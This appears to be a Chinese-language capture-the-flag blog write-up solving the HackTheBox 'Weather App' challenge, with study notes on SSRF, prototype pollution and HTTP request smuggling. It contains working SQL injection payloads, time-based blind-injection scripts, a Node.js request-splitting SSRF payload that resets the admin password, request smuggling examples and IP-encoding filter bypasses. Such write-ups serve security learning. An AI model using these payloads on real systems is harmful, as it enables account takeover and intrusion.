---
layout: post
title: HTB-Easy-Weather App
excerpt: "第六道HTB题目,解题过程"
date:   2021-05-13 17:30:00
categories: [HackTheBox]
comments: true
---

## 解题步骤

1. 题目描述：A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I'm hallucinating with the memories of my past life, it's a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I've been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that's operating this website and set me free! 🧙‍♀️

2. 访问网站![image-20210513173543804](https://monkeydatabase.github.io/img/image-20210513173543804.png)

   * 接口调用

     * 访问http://ip-api.com/json/获取当前用户的国家、省市、经纬度、时区、ISP提供商、IP地址

     * 访问该容器本身提供的接口http://IP:Port/api/weather

       * 请求体

         ```json
         {
             "endpoint":"api.openweathermap.org",
             "city":"",
             "country":""
         }
         ```
   
       * 响应体

         ```json
         {
             error: "Could not find CITYNAME or COUNTRYNAME"
         }
         ```
   
3. 下载题目提供的文件

   * 由整个目录结构可以看出，这是一个NodeJS后端
   * 页面
     * `/`-----get------>views/index.html：主页
     * `/register`-----get------>views/register.html：注册页面
     * `/register`-----post------>interface：提交接口，经过测试，没有Nginx转发，所以是限定了提交申请的IPv4地址为127.0.0.1(因为remoteAddress会输出IPv6地址和IPv4地址，通过正则表达式将IPv4前的部分删除，从而只校验IPv4地址)
     * `/login`-----get------>views/login.html：登录页面
     * `/login`-----post------>interface：登录接口
       * 检查用户名和密码是否填写，如果没有就返回Missing parameters
       * 调用数据库检查是否是admin
         * 如果是admin就返回`/www/flag`文件
         * 如果不是admin就返回You are not admin
       * 如果调用数据库出现问题就返回Something went wrong
     * `/api/weather`-----post------>interface：查询天气接口
       * 检查天气网站域名、地区名、国家编码是否填写，如果没有就返回Missing parameters
       * 调用WeatherHelper.js调用HTTP接口并解析返回数据
       * 将天气信息返回

4. 在本地运行

   * 检查sqlite文件，发现由空文件变成了有内容，且存在了admin的账号密码

     ```sqlite
     CREATE TABLE users (
                     id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                     username   VARCHAR(255) NOT NULL UNIQUE,
                     password   VARCHAR(255) NOT NULL
     adminba325315f6b500a7dc7d3b89623614b4bf1f05d855a4993c3a1bd3ae40c8fb23
     ```

   * 访问主页，发现与访问Hackthebox官方的页面不一样，可以正常获取用户的IP、地区、国家、天气

     ![image-20210514104351989](https://monkeydatabase.github.io/img/image-20210514104351989.png)
     
   * 在本地调用注册接口是可以调通的，不过自己注册的账号并不是admin账号，所以在登录时会返回You are not admin，因为无法注册admin账号，所以猜测是通过SQL注入获取admin权限
   
   * 试图通过对注册接口进行堆叠注入攻击来改动admin密码
   
     * 请求
   
       ```http
       POST /register HTTP/1.1
       Host: 127.0.0.1
       Content-Type: application/x-www-form-urlencoded
       Content-Length: 106
       
       username=ASDFADFADFADSADF&password=');UPDATE users SET `password` = '5644646554' WHERE username='admin'-- 
       ```
   
     * 响应
   
       ```http
       HTTP/1.1 200 OK
       X-Powered-By: Express
       Content-Type: application/json; charset=utf-8
       Content-Length: 37
       ETag: W/"25-v5J3d5iBeDcML9FBwd6qt6nQx9k"
       Date: Fri, 14 May 2021 08:44:48 GMT
       Connection: close
       
       {"message":"Successfully registered"}
       ```
   
     * 检查Sqlite数据库，发现admin密码未被更改
   
     * 应该是不支持堆叠注入攻击
   
   * 分析database.js
   
     * migrate()：初始化表结构并生成admin账号，admin密码为64位随机字符串
     * register()：将用户提交的用户名和密码插入数据库，没有使用预编译语句
     * isAdmin()：首先预编译语句，再将username和password填入进行查询，如果获取到一行记录且记录的username为admin返回true，否则返回false
   
   * 思路1
   
     * 既然register接口没有预编译，那么它就存在sql注入漏洞，就有办法通过它读取admin的密码
   
     * register前面检查了请求必须由回环地址提交，那么我们就通过它的查询天气接口`/api/weather`进行SSRF攻击调用它的register接口，读取密码，构造payload
   
     * 发现查询天气接口调用天气网站时使用的Get请求，但是可以提交注册账号信息的register是Post请求
   
     * 只能通过如下payload命中`/register`的Get方法获取到注册页面，无法命中Post方法，无法注册账号
   
       ```http
       POST /api/weather HTTP/1.1
       Host: IP:Port
       Proxy-Connection: keep-alive
       Content-Length: 85
       Content-Type: application/json
       Accept: */*
       Accept-Encoding: gzip, deflate
       Accept-Language: zh-CN,zh;q=0.9
       
       {"endpoint":"127.0.0.1/register#","city":"","country":""}
       ```
   
     * 第一次觉得Get和Post离得那么遥远
     
     * 因为它把SSRF的Response也进行了逻辑处理，所以使用SSRF进行目录遍历也不可能
     
     * 因为NodeJS服务通过routes/index.js进行路由，所以文件读取也基本不可能
   
5. 对源代码继续分析

   * database.js

     ```javascript
     async register(user, pass) {
         // TODO: add parameterization and roll public
         return new Promise(async (resolve, reject) => {
             try {
                 let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                 resolve((await this.db.run(query)));
             } catch(e) {
                 reject(e);
             }
         });
     }
     ```

     * 有一个注释，提到了新增参数设定并使他变为public，猜测是原型链污染
     
     * 该SQL的利用方式可以是基于时间的盲注，前提是能调用POST方法访问注册接口
     
       * SQL
     
         * 当admin的第i位是j时执行randomblob生成800000000个字符的随机字符串，从而使其产生数倍的SQL执行时间，从而影响到请求的响应时间，通过响应时间的长度来判断本次请求是否符合admin密码的第i位
     
         ```sql
         INSERT INTO 
         	users (username, password) 
         VALUES 
         	(
                 '176kdadasfadsflkj', 
                 '123'+(
                         case when 
                                 substr(
                                     (
                                         SELECT SUBSTR(password,1,1) 
                                         FROM users 
                                         WHERE username='admin'
                                     ),1,1)='5' 
                         then 
                         	randomblob(800000000) 
                         else 
                     		0 
                         end
                 )
         )-- ')
         ```
     
       * 生成字典
     
         ```python
         import time
         import os
         import urllib.parse
         
         
         if __name__ == '__main__':
             filename = './Output/{}.txt'.format(time.strftime('%Y-%m-%d %H-%M-%S', time.localtime(time.time())))
             passNumbers, = map(int, input("请输入密码位数：").split())
             codeArray = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
             template = "'+(\
                         CASE \
                             WHEN \
                                 SUBSTR((SELECT password FROM users WHERE username='admin'),{},1)='{}' \
                             THEN RANDOMBLOB(150000000) \
                             ELSE 'false~' \
                         END\
                                 )\
                         )-- "
         
             # template = "{}________{}"
         
             with open(filename, 'a') as file_object:
                 print("开始输出")
                 for pass_serial in range(passNumbers):
                     for code in codeArray:
                         password = template.format(pass_serial+1, code)
                         file_object.write('{}\n'.format(password))
                 # for user_serial in range(passNumbers):
                 #     for code in codeArray:
                 #         password = template.format(user_serial+1, code)
                 #         file_object.write('{}\n'.format(password))
             print("已输出到{}{}".format(os.path.abspath('.'), filename))
         
         ```
     
       * 基于时间的盲注脚本
     
         ```python
         import requests
         import os
         
         if __name__ == '__main__':
             url = 'http://127.0.0.1/register'
             path1 = './2021-05-16 13-05-37.txt'
             path2 = './2021-05-16 13-59-18.txt'
         
             res_path = './result.txt'
         
             header = {"Content-Type": "application/x-www-form-urlencoded"}
         
             with open(path1, 'r') as f1, open(path2, 'r') as f2, open(res_path, 'a') as result_file:
                 while True:
                     parameter1 = f1.readline().replace('\n', '').replace('\r', '')
                     parameter2 = f2.readline().replace('\n', '').replace('\r', '')
         
                     parameter1_name = 'username'
                     parameter2_name = 'password'
         
                     if not parameter1 or not parameter2:
                         print('attack finished')
                         break
         
                     data = {parameter1_name: parameter1, parameter2_name: parameter2}
                     resp = requests.post(url=url, data=data)
                     print('{},{},{}\n'.format(parameter1, resp.elapsed.total_seconds(), resp.text))
                     result_file.write('{},{}\n'.format(parameter1, resp.elapsed.total_seconds()))
         
         ```
     
       * 将产出的结果使用Excel打开进行排序，会发现有64行的请求时间会是其它行的十倍以上，将这64行的密码进行按序拼接，即可得到admin的密码
     
       * 但是！！！这是在本地调用能调到注册接口，怎么调用远端的注册接口呢？！！

6. 继续尝试调用远端的注册POST接口

   * 打印router的/register`的POST接口路由

     ```json
     Layer {
       handle: [Function: bound dispatch],
       name: 'bound dispatch',
       params: undefined,
       path: undefined,
       keys: [],
       regexp: /^\/register\/?$/i { fast_star: false, fast_slash: false },
       route: Route {
         path: '/register',
         stack: [ [Layer] ],
         methods: { post: true }
       }
     }
     ```

   * 发现NodeJS的v8版本存在HTTP走私漏洞，尝试构造Payload

     * Request

       ```http
       POST /api/weather HTTP/1.1
       Host: 139.59.183.166:32654
       Transfer-Encoding: chunked
       Transfer-Encoding: what-ever-maybe-cat
       
       1
       A
       0
       
       POST /register HTTP/1.1
       Host: 127.0.0.1
       foo: x
       
       
       ```

     * Response

       ```http
       HTTP/1.1 200 OK
       X-Powered-By: Express
       Content-Type: application/json; charset=utf-8
       Content-Length: 32
       ETag: W/"20-AgZSNwaB3tl777q9b3WtS9FZSXg"
       Date: Tue, 18 May 2021 03:38:15 GMT
       Connection: keep-alive
       
       {"message":"Missing parameters"}HTTP/1.1 401 Unauthorized
       X-Powered-By: Express
       Date: Tue, 18 May 2021 03:38:15 GMT
       Connection: keep-alive
       Content-Length: 0
       ```

     * 证明存在漏洞，但是此时`/register`接口仍然不被服务端看作从回环地址发起，因此需要通过`/api/weather`的SSRF漏洞发起请求

   * 发现NodeJS的v8版本存在拆分攻击漏洞

     * 期望SSRF发起的请求

       ```http
       GET /data/2.5/weather?q= HTTP/1.1
       Host:127.0.0.1
       
       POST /register HTTP/1.1
       Host:127.0.0.1
       Content-Type: application/x-www-form-urlencoded
       Content-Length: 29
       
       username=1001&password=123456
       
       GET /,bbb&units=metric&appid=xxx HTTP/1.1
       Host: 127.0.0.1
       Connection: close
       ```

     * 因此，city参数需要为以下内容

       ```tex
        HTTP/1.1\r\nHost:127.0.0.1\r\n\r\nPOST /register HTTP/1.1\r\nHost:127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 29\r\n\r\nusername=1001&password=123456\r\n\r\nGET /
       ```

     * 而nodejs v8版本存在拆分攻击，通过utf-8缺损编码可以使`\u010D`变成`\r`、`\u010A`变成`\n`、`\u0120`变成空格

     * 因此city为

       ```tex
       \u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010AContent-Type:application/x-www-form-urlencoded\u010D\u010AContent-Length:29\u010D\u010A\u010D\u010Ausername=1001&password=123456\u010D\u010A\u010D\u010AGET\u0120/
       ```

     * 最终整体语句为

       ```http
       GET /data/2.5/weather?q=ĠHTTP/1.1čĊHost:127.0.0.1čĊčĊPOSTĠ/registerĠHTTP/1.1č
       ĊHost:127.0.0.1čĊContent-Type:application/x-www-form-urlencodedčĊContent-Length:
       29čĊčĊusername=1001&password=123456čĊčĊGETĠ/,CN&units=metric&appid=10a62430af617
       a949055a46fa6dec32f HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n' ]
       ```

     * 经过实验，该方法顺利通过SSRF访问到`/register`的POST接口，但是因为这样构造出来的实际上是三个请求，其中第一个请求会返回404，HttpHelper整体也就会立即返回"Could not find ${city} or ${country}"，因此基于时间的盲注无法实现了，之前本地能跑出密码来的脚本也废了

7. 重新寻找利用SQL注入的方法

   * 无法使用基于时间的盲注的话，那么只能想办法改admin的密码了

   * 因为SQLite的 UNION 运算符用于合并两个或多个 SELECT 语句的结果，不返回任何重复的行。本题中被注入的语句是INSERT，因此无法使用联合注入

   * 由于username列存在唯一约束，所以可以利用INSERT OR REPLACE语法，修改admin账户密码

   * 构造sql语句

     ```sqlite
     INSERT INTO users
     (username,password)
     VALUES
     ('admin','23333')on CONFLICT(username) do UPDATE SET password='123' -- 
     ```

   * 构造city参数

     ```shell
     \u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010AContent-Type:application/x-www-form-urlencoded\u010D\u010AContent-Length:85\u010D\u010A\u010D\u010Ausername=admin&password=23333')on CONFLICT(username) do UPDATE SET password='123' -- \u010D\u010A\u010D\u010AGET\u0120/
     ```

   * 发起攻击，发现报错了，req.socket.remoteAddress是undefined，应该是第一个请求404导致的

8. 重新通过构造endpoint进行SSRF

   * 期望SSRF发起的请求

     ```http
     GET / HTTP/1.1
     Host:127.0.0.1
     
     POST /register HTTP /1.1
     Host:127.0.0.1
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 29
     
     username=admin&password=23333')on CONFLICT(username) do UPDATE SET password='123';-- 
     
     GET /?whatever=/data/2.5/weather?q=aaa,bbb&units=metric&appid=xxx HTTP/1.1
     Host: 127.0.0.1
     Connection: close
     ```

   * 因此，endpoint参数需要为以下内容

     ```tex
     127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010AContent-Type:application/x-www-form-urlencoded\u010D\u010AContent-Length:95\u010D\u010A\u010D\u010Ausername=admin&password=23333')on CONFLICT(username)\u0120do\u0120UPDATE\u0120SET\u0120password='233';--\u0120\u010D\u010A\u010D\u010AGET\u0120/?whatever=
     ```

   * 在本地起环境(Nodejs v8.12.0)进行实验

     * 请求内容为

       ```http
       POST /api/weather HTTP/1.1
       Host: 127.0.0.1
       User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
       Accept: */*
       Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
       Content-Type: application/json
       Content-Length: 446
       Connection: close
       
       {"endpoint":"127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010AContent-Type:application/x-www-form-urlencoded\u010D\u010AContent-Length:95\u010D\u010A\u010D\u010Ausername=admin&password=23333')on CONFLICT(username)\u0120do\u0120UPDATE\u0120SET\u0120password='233';--\u0120\u010D\u010A\u010D\u010AGET\u0120/?whatever=","city":"whatever","country":"CN"}
       ```

     * 响应体仍旧为

       ```http
       HTTP/1.1 200 OK
       X-Powered-By: Express
       Content-Type: application/json; charset=utf-8
       Content-Length: 41
       ETag: W/"29-4bQRAc98pC0JUBjnvgzWMGnhfGA"
       Date: Tue, 18 May 2021 11:56:29 GMT
       Connection: close
       
       {"error":"Could not find whatever or CN"}
       ```

     * 查看本地SQLite，admin的密码成功修改

       ![image-20210518200121427](https://monkeydatabase.github.io/img/image-20210518200121427.png)

     * 攻击成功

   * 对线上环境发起拆分攻击

     * 请求体为

       ```http
       POST /api/weather HTTP/1.1
       Host: IP:Port
       User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
       Accept: */*
       Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
       Content-Type: application/json
       Content-Length: 446
       Connection: close
       
       {"endpoint":"127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1\u010D\u010AContent-Type:application/x-www-form-urlencoded\u010D\u010AContent-Length:95\u010D\u010A\u010D\u010Ausername=admin&password=23333')on CONFLICT(username)\u0120do\u0120UPDATE\u0120SET\u0120password='233';--\u0120\u010D\u010A\u010D\u010AGET\u0120/?whatever=","city":"whatever","country":"CN"}
       ```

     * 在网页登陆，获得flag:HTB{w3lc0m3_t0_th3_p1p3_dr34m}

## 独立思考

### 1、NodeJS项目的框架是什么样的？

* package.json：类似于Maven的pom.xml，同时声明了程序的入口点
* public：存放image、css、js等需要返给前端的静态文件
* routes：存放路由文件
* views：存放视图文件
* node_modules：存放package.json中声明的依赖包。执行`npm install`之后npm会根据package.json下载依赖并将其存储在当前目录的node_modules下，如果不存在该目录则自动创建

### 2、如何快速理解NodeJS工程？

* 业务上：NodeJS、PHP、Java、Go、Python等后端基本上都是相通的，都是对外提供接口、对数据库CRUD、调用其它服务的接口。只要熟悉后端的常规流程，就可以对各种语言的后端程序快速理顺。
* 特性上：各个语言有自己的特性，例如Java需要Runtime.getRuntime.exec()执行系统指令、PHP的双引号可以对内部变量进行访存取值、Javascript的原型链污染攻击、Python的模板注入漏洞等。各个语言独有的魔术方法对于寻找调用链往往有事半功倍的效果。
* 版本上：由本题带来的最大的收获是注意当前服务器软件是否有哪些已知的漏洞，CTF不应该仅仅是脑筋急转弯，而应该与生产中的场景相结合。
* 经验上：需要经常关注相关的漏洞，尝试去寻找漏洞的原理，复现漏洞，总结经验。

### 3、哪些属性可以伪装源ip？为什么？

和客户端IP相关的属性主要有三个，当然开发人员也可以自定义Header属性：

* remoteAddress

  * 不同的语言获取方式不同

    | 语言/配置 | 获取方式                           |
    | --------- | ---------------------------------- |
    | js        | request.connect.remoteAddress      |
    | php       | $\_SERVER["REMOTE\_ADDR"]          |
    | java      | httpServletRequest.getRemoteAddr() |
    | python    | request.META['REMOTE_ADDR']        |
    | nginx     | $remote_addr                       |

  * 作用原理

    HTTP协议是基于TCP协议的，需要三次握手才能建立Socket连接，这三次握手使用的IP地址就是remoteAddress，该地址是唯一且真实有效的，因为一旦出现差错，三次握手的连接因无法收到response而失败

  * 优缺点

    * 优点：准确、可信、无法伪造
    * 缺点：因为是通过TCP连接的属性获取，因此只能获取当前TCP连接的远端地址
      * 如果用户直连我们的服务，获取的是用户的真实IP
      * 如果服务端使用了Nginx进行反向代理，获取的是Nginx的IP

* X-Forwarded-For(XFF)

  * 不同语言获取的方式类似，因为该属性是request的Header属性之一

  * 作用原理

    * 前端可以设置该字段为某个IP，`X-Forwarded-For: client`

    * 经过一个Nginx，如果Nginx配置了记录转发路径，那么它就会把自己的IP填入XFF数组

      `X-Forwarded-For：client, proxy1`

      ```tex
      proxy_set_header X-Forwarded-For $remote_addr;
      ```

    * 假设又经过了一个Nginx，如果该Nginx也配置了记录转发路径，同理`X-Forwarded-For: client, proxy1, proxy2`

    * 依次类推

  * 优缺点

    * 优点：可以记录全路径的IP
    * 缺点：前端传输来的第一个IP是来自于外部客户，也就是说第一个IP可以伪造，也就是说该方法无法获取可信的客户端IP，如果使用该字段进行操作可能引发SQL注入和XSS等漏洞

* X-Real-IP

  * 类似于X-Forwarded-For，同样是request的Header属性之一

  * 产生原因

    由于XFF的第一个IP不可信，但是又需要获取客户的真实IP，例如根据用户IP预报天气情况

  * 作用原理

    * 将一级代理中新增一个配置

      ```tex
    proxy_set_header X-Real-IP $remote_addr;
      ```

    * 因为$remote_addr无法篡改，那么一级代理拿到的$remote_addr就应该是用户IP，一级Nginx用该值覆盖掉Request中原来的值，后续的Nginx不再覆盖该值，那么最后到服务方获取到的就是用户真实IP
    
  * 优缺点
  
    * 优点
      * 可以获取到用户IP的同时保留转发的全路径
      * 当X-Real-IP与X-Forwarded-For的第一个值不同时，很有可能是遭遇黑客扫描，可以进行预警

### 4、Promise中的resolve、reject是什么含义？

* Promise的结构

  ```shell
  ƒ Promise()
      all: ƒ all()
      allSettled: ƒ allSettled()
      any: ƒ any()
      arguments: (...)
      caller: (...)
      length: 1
      name: "Promise"
      prototype: Promise
          catch: ƒ catch()
          constructor: ƒ Promise()
          finally: ƒ finally()
          then: ƒ then()
          Symbol(Symbol.toStringTag): "Promise"
          Symbol(finally): ƒ (b)
          Symbol(finally): ƒ (b)
          __proto__: Object
      race: ƒ race()
      reject: ƒ reject()
      resolve: ƒ resolve()
      Symbol(Symbol.species): (...)
      Symbol(allSettled): ƒ (c)
      get Symbol(Symbol.species): ƒ [Symbol.species]()
      __proto__: ƒ ()
      [[Scopes]]: Scopes[0]
  ```

  * Promise实际上是一个构造函数，它构造的对象具有all、allSettled、any、race、reject、resolve等方法
  * Promise通过Promise.prototype具有then、catch、finally方法

* Promise状态

  * pending：初始状态
  * fulfilled：操作成功
  * rejected：操作失败

* Promise状态流转

  * 实例化时需要传入一个executor，它的类型如下function(resolve,reject)，这个function会在Promise构造函数执行时同步执行
  * 在executor中调用resolve会将Promise置为fulfilled状态
  * 在executor中调用reject会将Promise置为rejected状态

* Promise状态消费

  * 创建一个Promise，executor会与构造函数同步执行

    ```javascript
    var p = new Promise(function(resolve,reject){
        var flag = false;
        if(true){
            resolve('da1');
        }
        else{
            reject('da2');}
    });
    ```

  * 状态消费

    ```javascript
    p.then(
        function(data){console.log(data);},
        function(data){console.log(data);});
    ```

    * 通过then()传入两个function
      * 第一个function是异步调用到达fulfilled状态后的回调
      * 第二个function是异步调用到达rejected状态后的回调

### 5、SSRF漏洞的成因是什么？如何防护以及如何绕过？

* 成因及场景

  * Web应用提供了从其他服务器获取数据的功能，根据用户指定的URL，Web应用会获取文件
    * 正常功能：用户提交申请单过程中提交的附件会被上传到文件服务器，用户之后查看提交记录的时候，可以**在Web应用中**点开之前的申请单**预览**之前提交的附件
    * 恶意利用：如果该功能实现方式是通过“用户点击了之前提交文件的链接，Web应用前端将该链接传给了后端，Web应用后端去访问文件服务器拿到文件”的方式的话，此时如果恶意构造该参数，即可将该Web应用作为跳板对内网进行攻击
  * WebVPN作为代理向外提供了访问内网资源的入口
    * 正常功能：用户登录WebVPN，在WebVPN中输入要访问的内网链接，WebVPN服务器帮助用户访问内网资源并将结果返回给用户
    * 恶意利用：如果WebVPN仅采用账号密码登录，那么恶意人员通过获取某个人的WebVPN账号和密码即可让内网门户大开

* 防护

  * 通过正则表达式限制前端传来的URL参数为指定路径下的内容，如`^http://example.com/somepath/.*`
  * URL参数黑名单，检查是否在黑名单中，如不允许访问127.0.0.1

* 绕过

  * 如果正则表达式匹配时只限制了必须是某个域名，如匹配`^http://example.com`，那么用可以通过`http://example.com@hackable.com`来绕过正则访问`http://hackable.com`。`@`通常使用在邮箱地址中分割用户名和域名、在ssh中分隔登录名和IP，只有`@`后面的会作为Host进行访问

  * 限制IP登录的话，可以通过编码绕过，如不允许访问127.0.0.1时，可以通过如下写法进行绕过

    * 0177.00.00.01(八进制)

      ```shell
      >ping 0177.00.00.01
      
      正在 Ping 127.0.0.1 具有 32 字节的数据:
      来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=128
      ```

      > 不能写成177.00.00.01，否则会访问177.0.0.1，因为八进制需要是0开头，和十六进制以0X或0x开头同理

    * 2130706433(十进制)

      ```shell
      ping 2130706433
      
      正在 Ping 127.0.0.1 具有 32 字节的数据:
      来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=128
      ```

    * 0x7f.0x0.0x0.0x1(十六进制)

      ```shell
      >ping 0x7f.0x0.0x0.0x1
      
      正在 Ping 127.0.0.1 具有 32 字节的数据:
      来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=128
      ```

    * 127.1(省略写法)

      ```shell
      ping 127.1
      
      正在 Ping 127.0.0.1 具有 32 字节的数据:
      来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=128
      ```

  * 如果正则过滤时连以`^http://example.com`开头都没过滤掉，只匹配了要包含`example.com`的话，那么它的子域名就一定能访问。如果此时渗透测试人员有可控域名，可以将域名指向目标机器，从而实现对目标机器的请求访问。

### 6、SSRF漏洞常见的利用方法有哪些？

* 扫描内网，进行主机发现、端口发现、服务发现
* 对指定目标存在漏洞的服务进行攻击
  * 当服务支持gopher协议时，可以通过gopher协议攻击内网的FTP、Telnet、Redis、Memcache。[{Related Article}](https://blog.chaitin.cn/gopher-attack-surfaces/)
* 对内网的服务进行指纹识别，识别出服务所使用的技术栈及版本号
* 当采用file://协议时，可进行文件读取
* 当是PHP环境且有expect扩展时，可通过expect协议进行命令执行

### 7、JavaScript有哪些常见的攻击方式？

* 原型链污染攻击

  * Javascript vs Java

    | JavaScript                                                   | Java(不使用字节码插桩及反射)                                 |
    | ------------------------------------------------------------ | ------------------------------------------------------------ |
    | 除了null以外的每个对象都会有一个\_\_proto\_\_属性，该属性指向该对象的原型 | Java中每个对象的类型指针指向它的Class对象                    |
    | JavaScript是弱类型语言                                       | Java是强类型语言                                             |
    | obj.\_\_proto\_\_.aaa=bbb新增aaa属性值为bbb                  | Java中的Class对象占用的空间和变量的数量及名称均在编译时确定了，无法改变 |
    | obj.\_\_proto\_\_ 获取原型对象<br/>obj.\_\_proto\_\_ =xxx修改原型对象 | object.getClass()获取Class对象<br/>Java中无法修改对象头中的类型指针 |
    | classname.prototype获取原型对象                              | classname.class获取Class对象                                 |

  * Javascript当对实例取某个属性取不到的时候，会查找与对象关联的原型中的属性

  * 原型也是对象，因此原型也是有原型的，从而构成了原型链

  * 污染样例(下列代码可依次在Chrome浏览器的Console中进行验证)

    ```js
    // 创建a对象
    let a={} 
    // 打印a对象的evil属性
    console.log(a.evil)
    // 因为无该属性，返回undefined
    undefined
    // 创建b对象
    let b={}
    // 对b对象的原型对象新增evil属性，值为2
    b.__proto__.evil=2
    2
    // 再次打印a对象的evil属性，因a对象无该属性故访问a的原型的evil属性，a的原型和b的原型是同一个，所以输出2
    console.log(a.evil)
    2
    // 原型链被污染
    ```

  * 若将可控参数的属性作为代码影响到原型，往往需要clone、merge等操作属性的方法

* node-serialize模块的反序列化RCE漏洞[{Related Article}](https://zhuanlan.zhihu.com/p/25581847)

### 8、什么是HTTP请求走私？

* HTTP管线化

  * 默认情况下，HTTP协议的每个TCP链接只能容纳一个HTTP请求和响应(因为TCP是全双工通信)，浏览器在接收到上一个请求的响应后再发送下一个请求。在使用持久连接中，消息传递采用”Request1->Response1->Request2->Response2->.........->RequestN->ResponseN“的有序串行方式
  * HTTP管线化是将多个HTTP Request合批提交的技术，在传输过程中不需要等待Server的Response。在使用持久连接中，消息传递可能变成”Request1->Request2->Reponse1->Request3->Reponse2->Response3“的乱序串行方式

* 分块编码

  * 分块编码是HTTP 1.1协议中定义的Client向Server提交数据的一种方法

  * 服务器收到chunked编码方式的数据时会分配一个缓冲区存放之，如果提交的数据大小未知，客户端会以一个协商好的分块大小向服务器提交数据。

  * 报文标记：`Transfer-Encoding: chunked`

  * 传输格式：

    * 每个chunk由两部分组成(长度和内容)，每个部分由`\r\n`分隔
    * 请求体由多个chunk组成，报文用一个长度为0的chunk结尾，因此结尾是`0\r\n\r\n`

    ```tex
    [chunk size][\r\n][chunk data][\r\n]
    [chunk size][\r\n][chunk data][\r\n]
    [chunk size = 0][\r\n][\r\n]
    ```

* 大体思路：在使用HTTP管线化时，由于单次数据传输可能携带多个Request报文，那么前端与后端需要对每个报文的结束位置达成一致，否则攻击者发送一个恶意报文，可能会被后端解释为两个不同的HTTP请求。此时被走私进来的第二个请求实际上并没有经过反向代理服务器的校验，就到达了Web应用服务器

* 攻击种类

  * CL-CL

    * 在`RFC7230`的第`3.3.3`节中的第四条中，规定当服务器收到的请求中包含两个`Content-Length`，而且两者的值不同时，需要返回400错误。然而，服务端程序并不都严格遵守规范

    * 假设有一个用户发起了恶意请求

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 7
      Content-Length: 6
      
      2333\r\n
      M
      ```

    * 假设反向代理服务器收到请求，将请求存储到缓冲区，解析时解析第一个Content-Length，那么反向代理服务器会将以下内容转发给Web应用服务器

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 7
      Content-Length: 6
      
      2333\r\n
      M
      ```

    * 假设Web应用服务器收到反向代理服务器转发来的数据，将请求存储到缓冲区，解析时解析第二个Content-Length，那么Web应用服务器会根据Content-Length=6从缓冲区读取内容，因此将识别到以下内容并进行处理

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 7
      Content-Length: 6
      
      2333\r\n
      ```

    * 此时Web应用服务器缓冲区被处理过的内容被清空，缓冲区的有效内容为

      ```tex
      M
      ```

    * 此时如果有正常用户请求，则会被代理服务器正常转发

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 6
      
      2333\r\n
      ```

    * Web应用服务器的缓冲区将变成如下内容

      ```http
      MPOST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 6
      
      2333\r\n
      ```

    * 此时正常用户的Request方法被污染成MPost，无法被正常解析

  * CL-TE

    * 同上，恶意请求如下

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0\r\n
      \r\n
      M
      ```

    * 假设反向代理服务器在有Content-Length和Transfer-Encoding时解析Content-Length，那么它将把整个请求转发给Web应用服务器

    * 假设Web应用服务器在有Content-Length和Transfer-Encoding时解析Transfer-Encoding的话，那么`0\r\n\r\n`将被识别为请求体的结束。因此，Web应用服务器将从缓冲区中取出以下请求

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0\r\n
      \r\n
      ```

    * 此时缓冲区中内容为`M`，该部分内容会污染下一个请求的请求方法。

    * 当然如果将遗留下的内容构造成一个新请求，造成了HTTP请求走私。

  * TE-CL

    * 即反向代理服务器处理Transfer-Encoding，Web应用服务器处理Content-Type

    * 同上，当恶意请求为如下内容

      ```http
      POST / HTTP/1.1
      Host: 127.0.0.1
      Connection: keep-alive
      Content-Length: 4
      Transfer-Encoding: chunked
      
      54\r\n
      GET /hack HTTP/1.1
      Host: 127.0.0.1
      Content-Length:5
      \r\n
      0\r\n
      \r\n
      ```

    * 假设反向代理服务器在有Content-Length和Transfer-Encoding时解析Transfer-Encoding的话，则将整体内容转发给Web应用服务器

